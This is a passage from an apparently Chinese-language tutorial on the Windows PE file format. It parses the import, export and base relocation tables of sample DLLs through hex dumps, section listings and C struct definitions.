class="hljs-number">5201</span>  ..CloseHandle.R.<br></code></pre></div></td></tr></table></figure><p>第二个函数: 207Eh - 1A00 = 67Eh</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0000067e</span>: <span class="hljs-number">5201</span> <span class="hljs-number">4578</span> <span class="hljs-number">6974</span> <span class="hljs-number">5468</span> <span class="hljs-number">7265</span> <span class="hljs-number">6164</span> <span class="hljs-number">0000</span> a<span class="hljs-number">704</span>  R.ExitThread....<br></code></pre></div></td></tr></table></figure><p>第三个函数: 208Ch - 1A00h = 68Ch</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0000068c</span>: a<span class="hljs-number">704</span> <span class="hljs-number">5265</span> <span class="hljs-number">7375</span> <span class="hljs-number">6</span>d<span class="hljs-number">65</span> <span class="hljs-number">5468</span> <span class="hljs-number">7265</span> <span class="hljs-number">6164</span> <span class="hljs-number">0000</span>  ..ResumeThread..<br></code></pre></div></td></tr></table></figure><p>前面两字节的空缺是函数名引用(Hint)</p><br/><p>查看导入函数:<br>= (IMAGE_THUNK_DATA)DWORD * 4 + (IMAGE_IMPORT_BY_NAME[Hint])4 = 20</p><p>到达 IMAGE_IMPORT_BY_NAME 的 Name 字段<br>64Ch + 20h(0ffset) = 66Ch</p><p>查看数据(导入函数名):<br>xxd -s 0x66C -l 0x90 calc.dll</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0000066c</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">7</span>f<span class="hljs-number">00</span> <span class="hljs-number">436</span>c <span class="hljs-number">6</span>f<span class="hljs-number">73</span> <span class="hljs-number">6548</span> <span class="hljs-number">616</span>e <span class="hljs-number">646</span>c  ......CloseHandl<br><span class="hljs-attribute">0000067c</span>: <span class="hljs-number">6500</span> <span class="hljs-number">5201</span> <span class="hljs-number">4578</span> <span class="hljs-number">6974</span> <span class="hljs-number">5468</span> <span class="hljs-number">7265</span> <span class="hljs-number">6164</span> <span class="hljs-number">0000</span>  e.R.ExitThread..<br><span class="hljs-attribute">0000068c</span>: a<span class="hljs-number">704</span> <span class="hljs-number">5265</span> <span class="hljs-number">7375</span> <span class="hljs-number">6</span>d<span class="hljs-number">65</span> <span class="hljs-number">5468</span> <span class="hljs-number">7265</span> <span class="hljs-number">6164</span> <span class="hljs-number">0000</span>  ..ResumeThread..<br><span class="hljs-attribute">0000069c</span>: d<span class="hljs-number">700</span> <span class="hljs-number">4372</span> <span class="hljs-number">6561</span> <span class="hljs-number">7465</span> <span class="hljs-number">5072</span> <span class="hljs-number">6</span>f<span class="hljs-number">63</span> <span class="hljs-number">6573</span> <span class="hljs-number">7341</span>  ..CreateProcessA<br><span class="hljs-attribute">000006ac</span>: <span class="hljs-number">0000</span> e<span class="hljs-number">402</span> <span class="hljs-number">4765</span> <span class="hljs-number">7454</span> <span class="hljs-number">6872</span> <span class="hljs-number">6561</span> <span class="hljs-number">6443</span> <span class="hljs-number">6</span>f<span class="hljs-number">6</span>e  ....GetThreadCon<br><span class="hljs-attribute">000006bc</span>: <span class="hljs-number">7465</span> <span class="hljs-number">7874</span> <span class="hljs-number">0000</span> <span class="hljs-number">2</span>a<span class="hljs-number">05</span> <span class="hljs-number">5365</span> <span class="hljs-number">7454</span> <span class="hljs-number">6872</span> <span class="hljs-number">6561</span>  text..*.SetThrea<br><span class="hljs-attribute">000006cc</span>: <span class="hljs-number">6443</span> <span class="hljs-number">6</span>f<span class="hljs-number">6</span>e <span class="hljs-number">7465</span> <span class="hljs-number">7874</span> <span class="hljs-number">0000</span> <span class="hljs-number">9</span>a<span class="hljs-number">05</span> <span class="hljs-number">5669</span> <span class="hljs-number">7274</span>  dContext....Virt<br><span class="hljs-attribute">000006dc</span>: <span class="hljs-number">7561</span> <span class="hljs-number">6</span>c<span class="hljs-number">41</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>c <span class="hljs-number">6</span>f<span class="hljs-number">63</span> <span class="hljs-number">4578</span> <span class="hljs-number">0000</span> e<span class="hljs-number">805</span> <span class="hljs-number">5772</span>  ualAllocEx....Wr<br><span class="hljs-attribute">000006ec</span>: <span class="hljs-number">6974</span> <span class="hljs-number">6550</span> <span class="hljs-number">726</span>f <span class="hljs-number">6365</span> <span class="hljs-number">7373</span> <span class="hljs-number">4</span>d<span class="hljs-number">65</span> <span class="hljs-number">6</span>d<span class="hljs-number">6</span>f <span class="hljs-number">7279</span>  iteProcessMemory<br></code></pre></div></td></tr></table></figure><p>然后再看看 FirstThunk(2000h)，减去 1A00h = 600h<br>同样指向 <code>IMAGE_THUNK_DATA</code>结构</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00000600</span>: <span class="hljs-number">7020</span> <span class="hljs-number">0000</span> <span class="hljs-number">7</span>e<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">8</span>c<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">9</span>c<span class="hljs-number">20</span> <span class="hljs-number">0000</span>  p ..~ ... ... ..<br><span class="hljs-attribute">00000610</span>: ae<span class="hljs-number">20</span> <span class="hljs-number">0000</span> c<span class="hljs-number">220</span> <span class="hljs-number">0000</span> d<span class="hljs-number">620</span> <span class="hljs-number">0000</span> e<span class="hljs-number">820</span> <span class="hljs-number">0000</span>  . ... ... ... ..<br><span class="hljs-attribute">00000620</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">4</span>c<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ....L ..........<br><span class="hljs-attribute">00000630</span>: fe<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">0020</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  . ... ..........<br><br><span class="hljs-attribute">00000640</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">7020</span> <span class="hljs-number">0000</span>  ............p ..<br><span class="hljs-attribute">00000650</span>: <span class="hljs-number">7</span>e<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">8</span>c<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">9</span>c<span class="hljs-number">20</span> <span class="hljs-number">0000</span> ae<span class="hljs-number">20</span> <span class="hljs-number">0000</span>  ~ ... ... ... ..<br><span class="hljs-attribute">00000660</span>: c<span class="hljs-number">220</span> <span class="hljs-number">0000</span> d<span class="hljs-number">620</span> <span class="hljs-number">0000</span> e<span class="hljs-number">820</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  . ... ... ......<br><span class="hljs-attribute">00000670</span>: <span class="hljs-number">7</span>f<span class="hljs-number">00</span> <span class="hljs-number">436</span>c <span class="hljs-number">6</span>f<span class="hljs-number">73</span> <span class="hljs-number">6548</span> <span class="hljs-number">616</span>e <span class="hljs-number">646</span>c <span class="hljs-number">6500</span> <span class="hljs-number">5201</span>  ..CloseHandle.R.<br><span class="hljs-attribute">00000680</span>: <span class="hljs-number">4578</span> <span class="hljs-number">6974</span> <span class="hljs-number">5468</span> <span class="hljs-number">7265</span> <span class="hljs-number">6164</span> <span class="hljs-number">0000</span> a<span class="hljs-number">704</span> <span class="hljs-number">5265</span>  ExitThread....Re<br></code></pre></div></td></tr></table></figure><br/><p>FirstThunk 在程序运行时被初始化。</p><p>FirstThunk 字段值指向的地址与 INT重复，系统在程序初始化的时候根据 OriginalFirstThunk找到函数名，调用 <code>GetProcAddress</code>函数(或功能类似的函数)并根据函数名取得函数的入口地址，然后用函数入口地址取代 FirstThunk 指向地址中对应的值(IAT)</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">    call 00401164<br>00401164<br>    jmp dword ptr [00402010]    ; 这个 IAT 地址内的数据指向导入函数真实地址<br></code></pre></div></td></tr></table></figure><br/><h2 id="输出表"><a href="#输出表" class="headerlink" title="输出表"></a>输出表</h2><p>输出表时数据目录表(DataDirectory)的第一个成员(0x00)，指向 <code>IMAGE_EXPORT_DIRECTORY</code>(IED)结构<br>DLL 文件提供输出表向系统提供输出函数名、序号和入口地址等信息</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br>DWORDCharacteristics;<br>DWORDTimeDateStamp;<br>WORDMajorVersion;<br>WORDMinorVersion;<br>DWORDName;                   <span class="hljs-comment">// 模块的真实名称</span><br>DWORDBase;                   <span class="hljs-comment">// 函数的起始序号</span><br>DWORDNumberOfFunctions;      <span class="hljs-comment">// AddressOfFunctions 阵列中元素个数(导出函数的总数)</span><br>DWORDNumberOfNames;          <span class="hljs-comment">// AddressOfNames 阵列中的元素个数(以名称方式导出的函数的总数)</span><br>DWORDAddressOfFunctions;     <span class="hljs-comment">// 指向函数地址数组   RVA</span><br>DWORDAddressOfNames;         <span class="hljs-comment">// 函数名字的指针地址 RAV</span><br>DWORDAddressOfNameOrdinals;  <span class="hljs-comment">// 指向输出序列号数组 RVA</span><br>&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;<br></code></pre></div></td></tr></table></figure><p>AddressOfFunctions : 指向保存所有输出函数的地址数组</p><p>NumberOfFunctions  : 保存数组元素数目</p><p>AddressOfNames : 指向保存通过名字引出的函数的地址数组 RVA</p><p>NumberOfNames  : 名字数目</p><p>此时有两个模块，分别是地址数组和名字数组，两个数组以 AddressOfNameOrdinals 作为连接枢纽；使用指向地址数组的索引最为链接，PE装载器在名字数组中找到匹配名字的同时，也获取了指向地址指标中对应元素的索引</p><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">                       |-&gt; ...                               AddressOfFunctions<br>                       |-&gt; NumberOfFunctions=<span class="hljs-number">3</span>            <span class="hljs-number">0x40042</span>         <span class="hljs-number">0x400197</span><br>                       |-&gt; NumberOfNames=<span class="hljs-number">2</span>            |-&gt; [Func1][<span class="hljs-number">0x40085</span>][Func3]  (其中 <span class="hljs-number">2</span>个以名称输出)<br>IMAGE_EXPORT_DIRECTORY |-&gt; AddressOfFunctions --------|<br>                       |<br>                       |-&gt; AddressOfNames ------------|-&gt; RVA <span class="hljs-keyword">of</span> Name <span class="hljs-number">1</span>  &lt;---&gt;  [Index <span class="hljs-keyword">of</span> Name <span class="hljs-number">1</span>] &lt;-|   <br>                       |                              |-&gt; RVA <span class="hljs-keyword">of</span> Name <span class="hljs-number">3</span>  &lt;---&gt;  [Index <span class="hljs-keyword">of</span> Name <span class="hljs-number">2</span>] &lt;-|<br>                       |-&gt; AddressOfNameOrdinals ---------------------------------------------------|<br>                                                         AddressOfNames        AddressOfNameOrdinals<br></code></pre></div></td></tr></table></figure><br/><p>例子：</p><p>PE 头起始：f8h<br>输出表：f8h + 78h(offset) = 170h</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00000030</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> f<span class="hljs-number">800</span> <span class="hljs-number">0000</span>  ................<br></code></pre></div></td></tr></table></figure><p>输出表: 18E50h</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00000170</span>: <span class="hljs-number">508</span>e <span class="hljs-number">0100</span>                                P...<br></code></pre></div></td></tr></table></figure><br/><p>计算文件偏移</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Sections</span>:<br><span class="hljs-attribute">Idx</span> Name          Size      VMA       LMA       File <span class="hljs-literal">off</span>  Algn<br>  <span class="hljs-attribute">0</span> .textbss      <span class="hljs-number">00010000</span>  <span class="hljs-number">10001000</span>  <span class="hljs-number">10001000</span>  <span class="hljs-number">00000000</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">ALLOC</span>, LOAD, CODE<br>  <span class="hljs-attribute">1</span> .text         <span class="hljs-number">000051</span>a<span class="hljs-number">2</span>  <span class="hljs-number">10011000</span>  <span class="hljs-number">10011000</span>  <span class="hljs-number">00000400</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, CODE<br>  <span class="hljs-attribute">2</span> .rdata        <span class="hljs-number">00001</span>f<span class="hljs-number">9</span>c  <span class="hljs-number">10017000</span>  <span class="hljs-number">10017000</span>  <span class="hljs-number">00005600</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br>  <span class="hljs-attribute">3</span> .data         <span class="hljs-number">00000200</span>  <span class="hljs-number">10019000</span>  <span class="hljs-number">10019000</span>  <span class="hljs-number">00007600</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, DATA<br>  <span class="hljs-attribute">4</span> .idata        <span class="hljs-number">00000973</span>  <span class="hljs-number">1001</span>a<span class="hljs-number">000</span>  <span class="hljs-number">1001</span>a<span class="hljs-number">000</span>  <span class="hljs-number">00007800</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br>  <span class="hljs-attribute">5</span> .msvcjmc      <span class="hljs-number">0000010</span>f  <span class="hljs-number">1001</span>b<span class="hljs-number">000</span>  <span class="hljs-number">1001</span>b<span class="hljs-number">000</span>  <span class="hljs-number">00008200</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, DATA<br>  <span class="hljs-attribute">6</span> .<span class="hljs-number">00</span>cfg        <span class="hljs-number">00000109</span>  <span class="hljs-number">1001</span>c<span class="hljs-number">000</span>  <span class="hljs-number">1001</span>c<span class="hljs-number">000</span>  <span class="hljs-number">00008400</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br>  <span class="hljs-attribute">7</span> .rsrc         <span class="hljs-number">00000326</span>  <span class="hljs-number">1001</span>d<span class="hljs-number">000</span>  <span class="hljs-number">1001</span>d<span class="hljs-number">000</span>  <span class="hljs-number">00008600</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br>  <span class="hljs-attribute">8</span> .reloc        <span class="hljs-number">0000057</span>c  <span class="hljs-number">1001</span>e<span class="hljs-number">000</span>  <span class="hljs-number">1001</span>e<span class="hljs-number">000</span>  <span class="hljs-number">00008</span>a<span class="hljs-number">00</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br></code></pre></div></td></tr></table></figure><p>18E50h 位于 .rdata 段</p><p>∆k = 17000h - 5600h = 11A00h</p><p>File Offset = RVA - ∆k = 18E50h - 11A00 = 7450h</p><p>文件偏移到 2450h 就是输出表内容:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00007450</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> ffff ffff <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">828</span>e <span class="hljs-number">0100</span>  ................<br><span class="hljs-attribute">00007460</span>: <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">788</span>e <span class="hljs-number">0100</span>  ............x...<br><span class="hljs-attribute">00007470</span>: <span class="hljs-number">7</span>c<span class="hljs-number">8</span>e <span class="hljs-number">0100</span> <span class="hljs-number">808</span>e <span class="hljs-number">0100</span> <span class="hljs-number">0</span>e<span class="hljs-number">11</span> <span class="hljs-number">0100</span> <span class="hljs-number">8</span>c<span class="hljs-number">8</span>e <span class="hljs-number">0100</span>  |...............<br><span class="hljs-attribute">00007480</span>: <span class="hljs-number">0000</span> <span class="hljs-number">6</span>d<span class="hljs-number">79</span> <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">2</span>e <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">00</span> <span class="hljs-number">4</span>d<span class="hljs-number">73</span> <span class="hljs-number">6700</span>  ..mydll.dll.Msg.<br><span class="hljs-attribute">00007490</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ................<br></code></pre></div></td></tr></table></figure><p>这个 DLL 只有一个函数 <code>Msg</code></p><br/><p>DLL Name              : 18E82h - 11A00h = 7482h</p><p>AddressOfFunctions    : 18E78h - 11A00h = 7478h</p><p>AddressOfNames        : 18E7Ch - 11A00h = 747Ch</p><p>AddressOfNameOrdinals : 18E80h - 11A00h = 7480h</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00007482</span>: <span class="hljs-number">6</span>d<span class="hljs-number">79</span> <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">2</span>e <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">00</span> <span class="hljs-number">4</span>d<span class="hljs-number">73</span> <span class="hljs-number">6700</span> <span class="hljs-number">0000</span>  mydll.dll.Msg...<br><br><span class="hljs-attribute">00007478</span>: <span class="hljs-number">0</span>e<span class="hljs-number">11</span> <span class="hljs-number">0100</span> <span class="hljs-number">8</span>c<span class="hljs-number">8</span>e <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">6</span>d<span class="hljs-number">79</span> <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">2</span>e  ..........mydll.<br><span class="hljs-attribute">00007488</span>: <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">00</span> <span class="hljs-number">4</span>d<span class="hljs-number">73</span> <span class="hljs-number">6700</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  dll.Msg.........<br><br><span class="hljs-attribute">0000747c</span>: <span class="hljs-number">8</span>c<span class="hljs-number">8</span>e <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">6</span>d<span class="hljs-number">79</span> <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">2</span>e <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">00</span>  ......mydll.dll.<br><span class="hljs-attribute">0000748c</span>: <span class="hljs-number">4</span>d<span class="hljs-number">73</span> <span class="hljs-number">6700</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  Msg.............<br><br><span class="hljs-attribute">00007480</span>: <span class="hljs-number">0000</span> <span class="hljs-number">6</span>d<span class="hljs-number">79</span> <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">2</span>e <span class="hljs-number">646</span>c <span class="hljs-number">6</span>c<span class="hljs-number">00</span> <span class="hljs-number">4</span>d<span class="hljs-number">73</span> <span class="hljs-number">6700</span>  ..mydll.dll.Msg.<br></code></pre></div></td></tr></table></figure><br/><p>PE 装载器调用 <code>GetProcAddress</code> 来查找 mydll.dll 里的 API 函数 Msg ，系统通过定位 mydll.dll 的 <code>IMAGE_EXPORT_DIRECTORY</code>结构开始工作</p><p>PE 装载器获得输出函数名表(ENT)的起始地址，知道这个数组只有一个条目，然后对名字进行二进制查找，直到发现字符串 “Msg” 为止。PE 装载器发现 Msg是数组的第一个条目后，加载器从输出序数表中读取相应的第一个值，这个值是 Msg的输出序数。使用输出序数作为进入 ETA 的索引(也要考虑 Base域值)，得到 Msg的 RVA，用这个 RVA地址加 mydll.dll 的载入地址，得到 Msg的实际地址</p><br/><h2 id="基址重定位"><a href="#基址重定位" class="headerlink" title="基址重定位"></a>基址重定位</h2><p>在 PE 文件中，重定位表往往单独作为一块，用 <code>.reloc</code> 表示</p><p>将文件中的所有可能需要修改的地址放在一个数组里，如果 PE 文件不在首选的地址(基地址)载入，那么文件中的每一个定位都需要被修正</p><br/><p>EXE文件总是使用独立的虚拟地址空间，所以 EXE 文件不需要重定位信息</p><br/><h3 id="基址重定位表结构"><a href="#基址重定位表结构" class="headerlink" title="基址重定位表结构"></a>基址重定位表结构</h3><p>基址重定位表通过数据目录表(0x05)的 <code>IMAGE_DIRECTORY_ENTRY_BASERELOC</code> 条目查找；基址重定位数据采用类似按页分割的方法组织，是由许多重定位块串接成的，每个块中存放 4KB(1000h) 的重定位信息，每个重定位数据块的大小必须以 **DWORD(4字节)**对齐</p><br/><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BASE_RELOCATION</span></span><br><span class="hljs-class">&#123;</span><br>DWORDVirtualAddress;         <span class="hljs-comment">// 重定位数据的开始 RVA 地址</span><br>DWORDSizeOfBlock;            <span class="hljs-comment">// 重定位块的长度</span><br><span class="hljs-comment">/* WORDTypeOffset[1]; */</span>       <span class="hljs-comment">// 重定位项数组</span><br>&#125; IMAGE_BASE_RELOCATION,*PIMAGE_BASE_RELOCATION;<br></code></pre></div></td></tr></table></figure><ul><li>VirtualAddress : 这组重定位数据的开始 RVA地址。各重定向的地址加上这个值才是该重定位项的完整 RVA 地址</li><li>SizeOfBlock : 当前重定位结构的大小。因为 VirtualAddress 和 SizeOfBlock 的大小都是固定的 4 字节，所以这个值减去 8 就是 TypeOffset 数组的大小</li><li>TypeOffset : 一个数组，数据每项大小为 2字节，共 16位。这 16位分为高 4 位和低 12位。高 4 位代表重定向类型；低 12位是重定向地址，它与 VirtualAddress 相加就是指向 PE映像中需要修改的地址数据的指针</li></ul><br/><p>重定位类型: </p><ul><li>0 : <code>IMAGE_REL_BSAED_ABSOLUTE</code> : 没有具体含义，只是为了让每个段 4字节对齐</li><li>3 : <code>IMAGE_REL_BSAED_HIGHLOW</code> : 重定位指向整个地址都需要修正，实际上大部分情况下都是这样的</li><li>10 : <code>IMAGE_REL_BSAED_DIR64</code> : 出现在 64位 PE文件中，对指向的整个地址进行修正</li></ul><p>在 x86可执行文件中，所有基址重定向类型都是 3 ，在一组重定位结束的地方会出现 0，这些重定位什么都不做，只是用于填充，以便下一个 <code>IMAGE_BASE_RELOCATION</code> 按 4 字节对齐</p><p>对于 IA-64 可执行文件，重定向类型似乎总是 10，尽管 IA-64 的 EXE页大小是 8KB，但基址重定位仍是 4KB的块</p><br/><p>例子：</p><p>xxd -s 0x198 -l 0x10 mydll.dll</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00000198</span>: <span class="hljs-number">00</span>e<span class="hljs-number">0</span> <span class="hljs-number">0100</span> <span class="hljs-number">9403</span> <span class="hljs-number">0000</span> b<span class="hljs-number">082</span> <span class="hljs-number">0100</span> <span class="hljs-number">3800</span> <span class="hljs-number">0000</span>  ............<span class="hljs-number">8</span>...<br></code></pre></div></td></tr></table></figure><p>重定位表: 1E000h，位于 .reloc , ∆k = 1E000h - 8A00h = 15600h</p><p>重定位表一直位于 <code>.reloc</code> 段，可以直接找 <code>.reloc</code> 段的地址</p><p>File Offset = RVA - ∆k = 1E000h - 15600h = 8A00h </p><p>Sections:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">7</span> .rsrc         <span class="hljs-number">00000326</span>  <span class="hljs-number">1001</span>d<span class="hljs-number">000</span>  <span class="hljs-number">1001</span>d<span class="hljs-number">000</span>  <span class="hljs-number">00008600</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br><span class="hljs-attribute">8</span> .reloc        <span class="hljs-number">0000057</span>c  <span class="hljs-number">1001</span>e<span class="hljs-number">000</span>  <span class="hljs-number">1001</span>e<span class="hljs-number">000</span>  <span class="hljs-number">00008</span>a<span class="hljs-number">00</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br></code></pre></div></td></tr></table></figure><p>IMAGE_BASE_RELOCATION 结构:</p><figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns"><span class="hljs-number">00008a00</span>: <span class="hljs-number">0010 0100</span> <span class="hljs-number">8400 0000</span> <span class="hljs-number">0f36 3736</span> <span class="hljs-number">4036 4536</span>  .........<span class="hljs-number">676@6E6</span><br><br><span class="hljs-number">00008a00</span>: <span class="hljs-number">0010 0100</span> <span class="hljs-number">8400 0000</span> <span class="hljs-number">0f36 3736</span> <span class="hljs-number">4036 4536</span>  